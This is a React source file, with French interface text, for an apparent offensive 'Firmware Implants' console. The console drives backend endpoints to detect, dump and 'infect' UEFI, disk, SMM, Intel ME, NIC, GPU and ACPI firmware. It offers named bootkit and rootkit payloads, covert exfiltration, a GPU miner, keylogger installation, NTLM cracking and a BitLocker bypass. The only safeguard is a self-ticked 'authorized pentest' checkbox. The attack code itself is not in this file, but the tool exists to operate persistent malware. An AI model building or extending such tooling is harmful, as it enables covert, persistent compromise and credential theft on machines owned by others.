import { useState, useEffect, useCallback } from 'react'
import { apiFetch } from '../../utils/auth'

const API = '/firmware'

const MODULES = [
  { id: 'uefi',     label: 'UEFI Bootkit',        icon: '🔒', ring: 'Ring 0',   color: '#ff4444' },
  { id: 'hdd',      label: 'HDD Firmware',         icon: '💾', ring: 'Hardware', color: '#ff6600' },
  { id: 'smm',      label: 'SMM Ring −2',          icon: '⚙️', ring: 'Ring −2',  color: '#cc00ff' },
  { id: 'me',       label: 'Intel ME / Ring −3',   icon: '🧠', ring: 'Ring −3',  color: '#0088ff' },
  { id: 'nic',      label: 'NIC Firmware',         icon: '🌐', ring: 'Hardware', color: '#00ccff' },
  { id: 'gpu',      label: 'GPU VBIOS',            icon: '🎮', ring: 'GPU ROM',  color: '#00ff88' },
  { id: 'tpm',      label: 'TPM 2.0',              icon: '🔑', ring: 'TPM',      color: '#ffcc00' },
  { id: 'acpi',     label: 'ACPI Rootkit',         icon: '📋', ring: 'AML',      color: '#ff8800' },
]

const PAYLOADS = {
  uefi: ['lojax', 'trickboot', 'especial', 'cosmicstrand', 'dropbear'],
  hdd:  ['grayfish', 'nls_933w', 'equation', 'hpa_drop'],
  smm:  [0x30, 0x60, 0xFF],
  me:   ['CVE-2017-5689', 'CVE-2017-5711', 'CVE-2020-8758'],
  nic:  ['packet_capture', 'packet_inject', 'covert_exfil', 'nic_backdoor', 'mitm'],
  gpu:  ['gpu_rootkit', 'framebuffer', 'compute_c2', 'crypto_miner', 'keylogger_gpu'],
  tpm:  [],
  acpi: ['persistence', 'keylogger', 'dropper', 'network_beacon', 'computrace'],
}

function Badge({ label, color = '#0af' }) {
  return (
    <span style={{
      background: color + '22', border: `1px solid ${color}66`,
      color, borderRadius: 4, padding: '1px 6px', fontSize: 10, fontFamily: 'monospace',
    }}>
      {label}
    </span>
  )
}

function InfoCard({ data, color }) {
  if (!data) return null
  return (
    <pre style={{
      background: '#0a0a1a', border: `1px solid ${color}33`, borderRadius: 6,
      padding: 12, fontSize: 11, color: '#c0ffc0', overflow: 'auto',
      maxHeight: 300, margin: '10px 0', lineHeight: 1.5,
    }}>
      {JSON.stringify(data, null, 2)}
    </pre>
  )
}

function ModulePanel({ mod }) {
  const [detRes, setDetRes] = useState(null)
  const [opRes,  setOpRes]  = useState(null)
  const [loading, setLoading] = useState(false)
  const [authOk, setAuthOk]  = useState(false)
  const [payload, setPayload] = useState(PAYLOADS[mod.id]?.[0] || '')
  const [param,   setParam]   = useState(
    mod.id === 'hdd' ? '/dev/sda' :
    mod.id === 'nic' ? 'eth0' :
    mod.id === 'me'  ? 'localhost' :
    mod.id === 'tpm' ? 'C:' : 'localhost'
  )

  const req = useCallback(async (path, method = 'GET', body = null) => {
    setLoading(true)
    try {
      const opts = method === 'GET' ? {} : {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body || {}),
      }
      const res = await apiFetch(`${API}/${path}`, opts)
      return res
    } catch (e) {
      return { error: e.message }
    } finally {
      setLoading(false)
    }
  }, [])

  const detect = async () => {
    const p = mod.id === 'hdd' ? `?device=${param}` :
              mod.id === 'nic' ? `?interface=${param}` :
              mod.id === 'me'  ? `?target=${param}` :
              mod.id === 'acpi'? `?target=${param}` : ''
    setDetRes(await req(`${mod.id}/detect${p}`))
  }

  const dump = async () => {
    const p = mod.id === 'hdd' ? `?device=${param}` :
              mod.id === 'nic' ? `?interface=${param}` :
              mod.id === 'acpi'? `?table=${payload || 'DSDT'}` : ''
    setOpRes(await req(`${mod.id}/dump${p}`))
  }

  const infect = async () => {
    if (!authOk) return alert('Cochez "autorisation confirmée" avant de lancer l\'implant')
    const body = { authorization_confirmed: true }
    if (mod.id === 'uefi')  { body.target = param; body.payload_type = payload }
    if (mod.id === 'hdd')   { body.device = param; body.payload_type = payload }
    if (mod.id === 'smm')   { body.smi_index = parseInt(payload) || 0x30 }
    if (mod.id === 'me')    { body.cve = payload }
    if (mod.id === 'nic')   { body.interface = param; body.payload = payload }
    if (mod.id === 'gpu')   { body.payload_type = payload }
    if (mod.id === 'acpi')  { body.table = payload || 'DSDT'; body.payload_type = 'persistence' }
    setOpRes(await req(`${mod.id}/infect`, 'POST', body))
  }

  const check = async () => {
    const p = mod.id === 'hdd' ? `?device=${param}` :
              mod.id === 'nic' ? `?interface=${param}` :
              mod.id === 'acpi'? `?table=${payload || 'DSDT'}` : ''
    setOpRes(await req(`${mod.id}/check${p}`))
  }

  const specialAction = async () => {
    if (!authOk) return alert('Cochez "autorisation confirmée"')
    const body = { authorization_confirmed: true }
    let path = ''
    if (mod.id === 'smm') { path = 'smm/install-keylogger' }
    else if (mod.id === 'me')  { path = 'me/kvm'; body.cve = payload }
    else if (mod.id === 'gpu') { path = 'gpu/crack'; body.hash_type = payload || 'NTLM'; body.hashes = [] }
    else if (mod.id === 'tpm') { path = 'tpm/bypass-bitlocker'; body.drive = param }
    else if (mod.id === 'acpi'){ path = 'acpi/execute'; body.method = '\\_SB.IMPL._INI' }
    else return
    setOpRes(await req(path, 'POST', body))
  }

  const specialLabel = {
    smm: '⌨️ Install Keylogger',
    me:  '🖥️ Activer KVM',
    gpu: '💥 GPU Crack NTLM',
    tpm: '🔓 Bypass BitLocker',
    acpi:'▶️ Execute AML',
  }

  return (
    <div style={{
      background: '#0d0d1f', border: `1px solid ${mod.color}44`,
      borderRadius: 8, padding: 16, marginBottom: 12,
    }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 12 }}>
        <span style={{ fontSize: 24 }}>{mod.icon}</span>
        <div>
          <div style={{ color: mod.color, fontWeight: 'bold', fontSize: 14 }}>{mod.label}</div>
          <Badge label={mod.ring} color={mod.color} />
        </div>
        {loading && <span style={{ color: '#888', fontSize: 12, marginLeft: 'auto' }}>⏳</span>}
      </div>

      {/* Param input */}
      {['hdd','nic','me','uefi','tpm','acpi'].includes(mod.id) && (
        <input
          value={param} onChange={e => setParam(e.target.value)}
          placeholder={mod.id === 'hdd' ? '/dev/sda' : mod.id === 'nic' ? 'eth0' : 'target'}
          style={{
            background: '#111', border: '1px solid #333', color: '#ccc',
            borderRadius: 4, padding: '4px 8px', fontSize: 11, width: '100%', marginBottom: 6,
          }}
        />
      )}

      {/* Payload select */}
      {PAYLOADS[mod.id]?.length > 0 && (
        <select
          value={payload} onChange={e => setPayload(e.target.value)}
          style={{
            background: '#111', border: '1px solid #333', color: '#ccc',
            borderRadius: 4, padding: '4px 8px', fontSize: 11, width: '100%', marginBottom: 8,
          }}
        >
          {PAYLOADS[mod.id].map(p => (
            <option key={p} value={p}>{p}</option>
          ))}
        </select>
      )}

      {/* Auth checkbox */}
      <label style={{ fontSize: 11, color: '#ff8888', display: 'flex', gap: 6, marginBottom: 8, cursor: 'pointer' }}>
        <input type="checkbox" checked={authOk} onChange={e => setAuthOk(e.target.checked)} />
        Pentest autorisé — je confirme l'autorisation
      </label>

      {/* Actions */}
      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
        {[
          ['🔍 Détecter', detect, '#0af'],
          ['📥 Dump',     dump,   '#0f8'],
          ['💉 Infecter', infect, mod.color],
          ['🔎 Check',    check,  '#ff8800'],
        ].map(([lbl, fn, col]) => (
          <button key={lbl} onClick={fn} style={{
            background: col + '22', border: `1px solid ${col}66`, color: col,
            borderRadius: 4, padding: '4px 10px', fontSize: 11, cursor: 'pointer',
          }}>{lbl}</button>
        ))}
        {specialLabel[mod.id] && (
          <button onClick={specialAction} style={{
            background: '#ff440022', border: '1px solid #ff440066', color: '#ff8888',
            borderRadius: 4, padding: '4px 10px', fontSize: 11, cursor: 'pointer',
          }}>{specialLabel[mod.id]}</button>
        )}
      </div>

      <InfoCard data={detRes} color={mod.color} />
      <InfoCard data={opRes}  color={mod.color} />
    </div>
  )
}

function HistoryPanel() {
  const [ops, setOps] = useState([])
  useEffect(() => {
    apiFetch(`${API}/history`).then(r => Array.isArray(r) && setOps(r)).catch(() => {})
  }, [])
  if (!ops.length) return null
  return (
    <div style={{ marginTop: 20 }}>
      <div style={{ color: '#888', fontSize: 12, marginBottom: 8 }}>Historique opérations</div>
      <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 11 }}>
        <thead>
          <tr style={{ color: '#666' }}>
            {['ID','Type','Action','Status','Sim','Date'].map(h => (
              <th key={h} style={{ textAlign: 'left', padding: '4px 8px', borderBottom: '1px solid #222' }}>{h}</th>
            ))}
          </tr>
        </thead>
        <tbody>
          {ops.map(o => (
            <tr key={o.id} style={{ color: o.simulated ? '#666' : '#0af' }}>
              <td style={{ padding: '3px 8px' }}>{o.id}</td>
              <td style={{ padding: '3px 8px' }}>{o.type}</td>
              <td style={{ padding: '3px 8px' }}>{o.operation}</td>
              <td style={{ padding: '3px 8px', color: o.status === 'done' ? '#0f0' : '#f80' }}>{o.status}</td>
              <td style={{ padding: '3px 8px' }}>{o.simulated ? '🔵' : '🔴'}</td>
              <td style={{ padding: '3px 8px', color: '#555' }}>{o.created_at?.slice(0,19)}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )
}

export default function FirmwareImplants() {
  const [overview, setOverview] = useState(null)
  const [tab, setTab] = useState('modules')

  useEffect(() => {
    apiFetch(`${API}/overview`).then(r => setOverview(r)).catch(() => {})
  }, [])

  return (
    <div style={{
      height: '100vh', overflowY: 'auto', padding: 20,
      background: 'linear-gradient(135deg, #050510 0%, #0a0520 100%)',
      color: '#c0c0e0', fontFamily: 'monospace',
    }}>
      {/* Header */}
      <div style={{ marginBottom: 20 }}>
        <div style={{ fontSize: 22, fontWeight: 'bold', color: '#ff4444', letterSpacing: 2 }}>
          ⚡ FIRMWARE IMPLANTS — BLOC 2
        </div>
        <div style={{ fontSize: 12, color: '#666', marginTop: 4 }}>
          Persistance supra-étatique · UEFI / HDD / SMM / ME / NIC / GPU / TPM / ACPI
        </div>
        <div style={{ fontSize: 11, color: '#ff4444', marginTop: 4, padding: '4px 8px', background: '#ff000011', borderRadius: 4, display: 'inline-block' }}>
          ⚠️ Usage exclusivement légal — pentest autorisé uniquement
        </div>
      </div>

      {/* Overview cards */}
      {overview && (
        <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', marginBottom: 20 }}>
          {overview.modules.map(m => {
            const mod = MODULES.find(x => x.id === m.id) || MODULES[0]
            return (
              <div key={m.id} style={{
                background: '#0d0d1f', border: `1px solid ${mod.color}44`,
                borderRadius: 6, padding: '8px 12px', fontSize: 11, minWidth: 120,
              }}>
                <div style={{ color: mod.color, fontWeight: 'bold' }}>
                  {mod.icon} {m.name}
                </div>
                <div style={{ color: '#666', marginTop: 2 }}>{m.ring}</div>
                <div style={{ color: '#444', marginTop: 1, fontSize: 10 }}>{m.persistence}</div>
              </div>
            )
          })}
        </div>
      )}

      {/* Tabs */}
      <div style={{ display: 'flex', gap: 4, marginBottom: 16 }}>
        {[['modules','Modules'], ['history','Historique']].map(([id, lbl]) => (
          <button key={id} onClick={() => setTab(id)} style={{
            background: tab === id ? '#1a1a3a' : 'transparent',
            border: `1px solid ${tab === id ? '#0af' : '#333'}`,
            color: tab === id ? '#0af' : '#666',
            borderRadius: 4, padding: '4px 12px', cursor: 'pointer', fontSize: 12,
          }}>{lbl}</button>
        ))}
      </div>

      {tab === 'modules' && (
        <div>
          {MODULES.map(mod => <ModulePanel key={mod.id} mod={mod} />)}
        </div>
      )}

      {tab === 'history' && <HistoryPanel />}
    </div>
  )
}
